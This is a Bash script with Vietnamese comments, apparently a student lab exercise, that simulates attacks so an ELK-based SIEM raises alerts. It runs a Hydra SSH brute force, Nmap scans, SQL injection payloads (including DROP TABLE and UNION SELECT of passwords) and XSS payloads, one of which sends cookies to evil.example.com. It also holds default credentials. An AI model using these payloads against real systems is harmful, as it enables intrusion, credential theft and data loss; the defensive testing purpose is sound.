#!/bin/bash
# =============================================================================
# attack_simulation.sh — Người 3: Tấn công thực tế Phase 5
# Kết hợp với generate_test_logs.sh của Người 1/2 để trigger alerts thực
#
# Cách dùng:
#   bash attack_simulation.sh                        # dry-run, xem lệnh
#   VICTIM=localhost WEBPORT=8080 bash attack_simulation.sh --run  # thực tế
# =============================================================================

set -euo pipefail

# ─── Biến cấu hình ────────────────────────────────────────────────────────────
VICTIM="${VICTIM:-localhost}"
SSH_PORT="${SSH_PORT:-2222}"
WEBPORT="${WEBPORT:-8080}"
ES_HOST="${ES_HOST:-https://localhost:9200}"
PROJECT_DIR="${PROJECT_DIR:-$HOME/CO3069_252_CLM/srcs}"
ENV_FILE="$PROJECT_DIR/.env"

RED='\033[0;31m'; YLW='\033[1;33m'; GRN='\033[0;32m'; BLU='\033[0;34m'; NC='\033[0m'
RUN_MODE=false
[[ "${1:-}" == "--run" ]] && RUN_MODE=true

banner()  { echo -e "\n${YLW}══════════════════════════════════════════${NC}"; echo -e "${YLW}  $1${NC}"; echo -e "${YLW}══════════════════════════════════════════${NC}"; }
ok()      { echo -e "${GRN}[✓] $1${NC}"; }
info()    { echo -e "${BLU}[→] $1${NC}"; }
warn()    { echo -e "${YLW}[!] $1${NC}"; }
err()     { echo -e "${RED}[✗] $1${NC}"; }
show_cmd(){ echo -e "    ${BLU}$1${NC}"; }

# ─── Đọc ELASTIC_PASSWORD từ .env ─────────────────────────────────────────────
if [[ -f "$ENV_FILE" ]]; then
    EPASS=$(grep "^ELASTIC_PASSWORD=" "$ENV_FILE" | cut -d= -f2 | tr -d '\r\n')
    HMAC_KEY=$(grep "^LOG_HMAC_KEY=" "$ENV_FILE" | cut -d= -f2 | tr -d '\r\n')
else
    warn ".env không tìm thấy tại $ENV_FILE — dùng password mặc định"
    EPASS="changeme_elastic_password"
    HMAC_KEY="YourSuperSecretKey123"
fi

# ─── Kiểm tra công cụ ─────────────────────────────────────────────────────────
banner "Kiểm tra công cụ cần thiết"
TOOLS_OK=true
for tool in hydra nmap curl python3; do
    if command -v "$tool" &>/dev/null; then
        ok "$tool — $(command -v $tool)"
    else
        err "$tool chưa cài: sudo apt install -y $tool"
        TOOLS_OK=false
    fi
done

if [[ "$RUN_MODE" == false ]]; then
    echo ""
    warn "━━━ DRY-RUN MODE: chỉ hiện lệnh, không chạy thật ━━━"
    warn "Thêm --run để chạy thực tế"
    warn "Ví dụ: VICTIM=localhost WEBPORT=8080 bash $0 --run"
fi

echo ""
echo -e "${RED}[!] TARGET: $VICTIM (SSH:$SSH_PORT / Web:$WEBPORT)${NC}"
echo    "    Nhấn Enter để tiếp tục, Ctrl+C để huỷ..."
read -r

# ─── ATTACK 1: SSH Brute-force (Hydra) ────────────────────────────────────────
banner "ATTACK 1 — SSH Brute-force (Hydra)"
info "Mục tiêu: ssh://$VICTIM:$SSH_PORT"
info "Ngưỡng cảnh báo: >5 lần fail / 60 giây"
info "Tags Logstash: ssh_failed_login, security_alert, authentication_failure"
echo ""

# Tạo wordlist nhỏ để test nhanh
cat > /tmp/attack_passwords.txt << 'WORDLIST'
123456
password
admin
root
testpass
password123
letmein
qwerty
abc123
iloveyou
toor
pass
test
WORDLIST

show_cmd "hydra -l root -P /tmp/attack_passwords.txt -t 6 -V -f -s $SSH_PORT $VICTIM ssh"

if [[ "$RUN_MODE" == true ]]; then
    hydra -l root -P /tmp/attack_passwords.txt \
          -t 6 -V -f \
          -s "$SSH_PORT" "$VICTIM" ssh 2>&1 | head -40 || true
    ok "Hydra xong — kiểm tra Security → Alerts trên Kibana"
fi

echo ""
echo "  → Đồng thời Logstash sẽ parse auth.log và tag: ssh_failed_login"
echo "  → Index: security-alerts-$(date +%Y.%m.%d)"

# ─── ATTACK 2: Port Scan (Nmap) ───────────────────────────────────────────────
banner "ATTACK 2 — Port Scan (Nmap → UFW BLOCK)"
info "Mục tiêu: $VICTIM"
info "Logstash bắt: UFW BLOCK → tag blocked_connection + potential_port_scan"
echo ""

show_cmd "sudo nmap -sS -p 1-1000 --min-rate 2000 -T4 $VICTIM"
show_cmd "sudo nmap -sV --script=http-headers,http-title $VICTIM -p $WEBPORT"
show_cmd "sudo nmap -A -p $SSH_PORT,$WEBPORT $VICTIM"

if [[ "$RUN_MODE" == true ]]; then
    sudo nmap -sS -p 1-200 --min-rate 2000 -T4 "$VICTIM" | tail -15 || true
    ok "Nmap xong — check Security → Alerts"
fi

# ─── ATTACK 3: SQL Injection (curl) ───────────────────────────────────────────
banner "ATTACK 3 — SQL Injection (curl → Nginx log → Logstash detect)"
info "Mục tiêu: http://$VICTIM:$WEBPORT"
info "Logstash regex: (?i)(UNION|SELECT|DROP|%27) → tag sql_injection + security_alert"
echo ""

declare -a SQLI=(
    "' OR '1'='1"
    "' OR 1=1--"
    "' UNION SELECT null,username,password FROM users--"
    "'; DROP TABLE users;--"
    "1' AND SLEEP(5)--"
    "1%27%20UNION%20SELECT%20null,username,password%20FROM%20users--"
)

for payload in "${SQLI[@]}"; do
    enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
    url="http://$VICTIM:$WEBPORT/products.php?id=${enc}"
    info "SQLi: ${payload:0:50}..."
    show_cmd "curl -sS --max-time 3 '$url'"
    if [[ "$RUN_MODE" == true ]]; then
        curl -sS --max-time 3 "$url" -o /dev/null -w "    HTTP %{http_code}\n" || true
        sleep 0.4
    fi
done

echo ""
info "Dùng generate_test_logs.sh của Người 2 để thêm log trực tiếp:"
show_cmd "sudo bash $PROJECT_DIR/../generate_test_logs.sh"

# ─── ATTACK 4: XSS (curl) ─────────────────────────────────────────────────────
banner "ATTACK 4 — XSS Attack (curl)"
info "Logstash regex: (?i)(<script|javascript:|onerror=|onload=) → tag xss + security_alert"
echo ""

declare -a XSS=(
    "<script>alert(document.cookie)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=fetch('https://evil.example.com/'+document.cookie)>"
    "javascript:alert(1)"
)

for payload in "${XSS[@]}"; do
    enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
    url="http://$VICTIM:$WEBPORT/search?q=${enc}"
    info "XSS: ${payload:0:50}"
    show_cmd "curl -sS --max-time 3 '$url'"
    if [[ "$RUN_MODE" == true ]]; then
        curl -sS --max-time 3 "$url" -o /dev/null -w "    HTTP %{http_code}\n" || true
        sleep 0.4
    fi
done

# ─── ATTACK 5: Unauthorized Delete (RBAC 403 test) ────────────────────────────
banner "ATTACK 5 — Unauthorized Elasticsearch Delete (RBAC Test)"
info "Dùng tài khoản Viewer, thử DELETE → phải nhận 403 Forbidden"
echo ""

# Tạo viewer user trước
show_cmd "curl -k -X POST -u elastic:\$EPASS -H 'Content-Type: application/json' \\"
show_cmd "  '$ES_HOST/_security/user/viewer_user' \\"
show_cmd "  -d '{\"password\":\"viewerpass123\",\"roles\":[\"kibana_viewer\"]}'"

if [[ "$RUN_MODE" == true ]]; then
    CREATE=$(curl -k -s -X POST \
        -u "elastic:$EPASS" \
        -H "Content-Type: application/json" \
        "$ES_HOST/_security/user/viewer_user" \
        -d '{"password":"viewerpass123","roles":["kibana_viewer"],"full_name":"Viewer Test"}' 2>&1 || true)
    echo "    Create user: $CREATE"
fi

echo ""
show_cmd "curl -k -v -X DELETE -u viewer_user:viewerpass123 \\"
show_cmd "  '$ES_HOST/logs-$(date +%Y.%m.%d)/_doc/1' 2>&1 | grep '< HTTP'"

if [[ "$RUN_MODE" == true ]]; then
    RESP=$(curl -k -s -o /dev/null -w "%{http_code}" -X DELETE \
        -u "viewer_user:viewerpass123" \
        "$ES_HOST/logs-$(date +%Y.%m.%d)/_doc/1" 2>&1 || true)
    if [[ "$RESP" == "403" ]]; then
        ok "HTTP $RESP Forbidden — RBAC chặn thành công! ✓"
    else
        warn "HTTP $RESP — kiểm tra lại RBAC config của Người 1"
    fi
fi

# ─── ATTACK 6: Dùng generate_test_logs.sh (kết hợp với Người 2) ──────────────
banner "ATTACK 6 — Dùng generate_test_logs.sh của Người 2 (cách chuẩn nhất)"
info "Script này append log trực tiếp vào /var/log/auth.log và /var/log/nginx/access.log"
info "Filebeat đọc → Logstash parse → ES index → Kibana alert"
echo ""

show_cmd "sudo bash $PROJECT_DIR/../generate_test_logs.sh"
echo ""
echo "  Script sẽ tạo:"
echo "    • SSH Failed password (auth.log)   → trigger: ssh_failed_login"
echo "    • SQL Injection (nginx/access.log)  → trigger: sql_injection"
echo "    • XSS (nginx/access.log)            → trigger: xss"
echo "    • UFW BLOCK (ufw.log)               → trigger: blocked_connection"
echo ""
warn "Đây là cách CHUẨN NHẤT cho demo: Filebeat → Logstash → ES → Kibana real-time"

# ─── SUMMARY ──────────────────────────────────────────────────────────────────
banner "TỔNG KẾT — Kiểm tra kết quả trên Kibana"
echo ""
echo "  1. Mở https://localhost:5601"
echo "  2. Đăng nhập: elastic / $EPASS"
echo "  3. Security → Alerts"
echo "  4. Đặt refresh: Every 5 seconds (góc trên phải)"
echo "  5. Chạy lại attacks → thấy alerts nhảy đỏ real-time"
echo ""
echo "  Hoặc query Elasticsearch trực tiếp:"
echo ""
show_cmd "curl -k -u elastic:$EPASS '$ES_HOST/security-alerts-*/_count?pretty'"
show_cmd "curl -k -u elastic:$EPASS '$ES_HOST/logs-*/_count?pretty'"
show_cmd "curl -k -u elastic:$EPASS '$ES_HOST/_cat/indices?v'"
echo ""
echo -e "${GRN}  Để chạy thực tế: VICTIM=localhost SSH_PORT=2222 WEBPORT=8080 bash $0 --run${NC}"